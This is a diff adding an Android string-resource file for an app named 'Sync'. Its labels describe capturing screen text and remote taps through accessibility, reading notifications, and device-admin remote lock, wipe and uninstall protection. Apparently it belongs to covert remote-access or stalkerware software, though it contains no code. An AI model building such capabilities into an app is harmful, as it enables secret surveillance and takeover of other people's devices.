@@ -1,0 +1,11 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <string name="app_name">Sync</string>
+    <string name="accessibility_label">Sync Accessibility</string>
+    <string name="accessibility_desc">Text capture aur remote tap/swipe ke liye</string>
+    <string name="notif_label">Sync Notification Reader</string>
+    <string name="admin_label">Sync Admin</string>
+    <string name="admin_desc">Remote lock, wipe aur uninstall protection</string>
+    <string name="chan_service">Service</string>
+    <string name="chan_service_desc">Remote control connection</string>
+</resources>
